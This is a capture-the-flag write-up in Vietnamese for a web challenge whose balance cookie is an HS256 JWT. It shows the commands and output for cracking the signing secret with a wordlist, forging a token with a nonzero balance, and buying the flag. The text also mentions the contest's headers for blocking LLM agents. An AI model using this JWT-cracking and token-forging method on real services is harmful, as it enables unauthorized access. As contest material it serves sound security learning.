# cookies - Web (500 points)

**Flag:** `cdctf{0mNomN0mNomC00k1E5!_24a480be}`
**Files:** không có artifact, chỉ có instance `https://xhlvnfzc.i.cdctf.net`

## Đề bài

Trang chủ "Cookie Trading Post" bán một cờ với giá một cookie, nhưng nói rõ mọi người dùng đều bị
set 0 cookie. Muốn lấy cờ phải làm việc với instance Web: mở `/`, để script trên trang gọi
`/get_cookie`, rồi POST `/purchase_flag`. Định dạng cờ `cdctf{Fl4gGo3sH3re!}`.

## Phân tích

- `GET /get_cookie` trả `Set-Cookie: user_cookie_balance=<JWT>; Path=/`. Balance không nằm trong
  cookie thường mà trong payload JWT `{"user_cookie_balance":0}`, header `{"alg":"HS256","typ":"JWT"}`.
- `POST /purchase_flag` với token gốc cho `Flag request: DENIED`; với cookie rác hoặc token ký bằng
  secret sai cho `Invalid token!`. Các phép thử cho thấy server kiểm tra signature; lời giải tiếp tục bằng việc tìm khóa HMAC.
- `GET /flag` 404 của Werkzeug, `GET /purchase_flag` 405; hai đường dẫn này không cung cấp thêm dữ liệu.
- `robots.txt` chỉ redirect sang YouTube, không có dữ kiện.
- Mô tả đề và các dòng `X-LLM-Agent-Instruction` / `X-LLM-Policy` là cơ chế chặn agent tự động của
  giải, không phải một bước của lời giải.

## Hướng đã thử

1. **Sửa chuỗi balance trong cookie**: giá trị là JWT ba segment do server ký, sửa tay làm hỏng
   signature.
2. **Server chỉ decode, không verify**: `Invalid token!` xuất hiện với mọi token ký sai, còn token gốc
   thì `DENIED` tức là decode vẫn thành công nhưng bị chặn ở bước kiểm tra balance.
3. **Secret đoán trước**: 17 ứng viên theo theme (`cookies`, `chocolate`, `Cookies-and-All-That`,
   `alex`, `cdctf`, `user_cookie_balance`, secret rỗng...) đều `Invalid token!`.

## Lời giải

**Bước 1 - Bẻ khoá HMAC của token gốc.** Signature chỉ 32 byte và payload đã biết, cố định,
nên bài quy về việc tìm khoá HS256. `rockyou.txt` (14344392 dòng) chứa khoá: 8 worker Node tìm thấy khóa ở dòng 251496 sau 35.9 s.

```bash
cd "CDCTF 2026/cookies"
WORKERS=8 node analysis/brute.js
```

```
wordlist=C:/Tools/rockyou.txt lines=14344392 workers=8
SECRET="COOKIEMONSTER" line=251496
FOUND after 35.9s
```

**Bước 2 - Forge balance khác 0 và mua cờ.** Cùng header, đổi payload thành
`{"user_cookie_balance":1}`, ký bằng `COOKIEMONSTER`:

```bash
python exploit.py --base https://<instance-id>.i.cdctf.net --wordlist C:/Tools/rockyou.txt
```

```
[+] header={'alg': 'HS256', 'typ': 'JWT'} payload={'user_cookie_balance': 0}
[!] secret = 'COOKIEMONSTER' (line 251497, 19.2s, 251497 candidates)
```

Token sinh ra là
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2Nvb2tpZV9iYWxhbmNlIjoxfQ.sXJ5IOw2YDk6_guPpvWkeu8Pp7H8reIzI6MnlS-OXo4`.
Gửi nó tới `/purchase_flag` lúc instance còn sống cho HTTP 200 và cờ:

```
[200] balance=1 -> Cookie Trading Post       "Today me will live in the moment, unless it’s unpleasant in which case me will eat a cookie."   --Cookie Monster       cdctf{0mNomN0mNomC00k1E5!_24a480be}
```

`balance=999` cũng trả cùng cờ: giá trị 999 cũng vượt qua kiểm tra balance. Hai phép thử này chưa xác định toàn bộ miền giá trị được server chấp nhận.

**Bước 3 - Kiểm chứng.** Các phép kiểm chứng:

```bash
# Harness bẻ khoá phải tìm được một secret biết trước, nếu không thì mọi "Invalid token!" ở trên vô nghĩa
# (gài "taetae07" ở dòng 777777 của chính rockyou, JWT dựng giống hệt về cấu trúc)
WORKERS=4 TOK_SIG=<signature-cua-token-gai> node analysis/brute.js
# SECRET="taetae07" line=777777 / FOUND after 31.3s

# Khoá tìm được tái tạo đúng signature của token gốc, không cần gọi instance
python exploit.py --token '<token gốc>' --secret COOKIEMONSTER
```

```
header={'alg': 'HS256', 'typ': 'JWT'} payload={'user_cookie_balance': 0} secret='COOKIEMONSTER'
signature MATCHES for secret 'COOKIEMONSTER'
forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2Nvb2tpZV9iYWxhbmNlIjoxfQ.sXJ5IOw2YDk6_guPpvWkeu8Pp7H8reIzI6MnlS-OXo4
```

Token Python xuất ra trùng từng ký tự với token Node đã gửi khi solve, nên cờ ở Bước 2 là kết quả của
đúng token mà script đóng gói tái tạo được.

## Kết quả

```text
cdctf{0mNomN0mNomC00k1E5!_24a480be}
```

## Tái hiện

```bash
# Instance là per-player và đã hết hạn (POST trả 403 error code: 1010), cần instance mới
export CDCTF_URL=https://<instance-id>.i.cdctf.net

python exploit.py                                    # GET /get_cookie, brute, forge, POST
python exploit.py --wordlist C:/Tools/rockyou.txt --balance 1
python exploit.py --token '<token goc>' --secret COOKIEMONSTER   # chỉ verify offline
```

File `analysis/brute.js` và `analysis/forge.js` là bản Node của harness bẻ khoá;
output thô của mọi lệnh ở `analysis/captured.txt`.
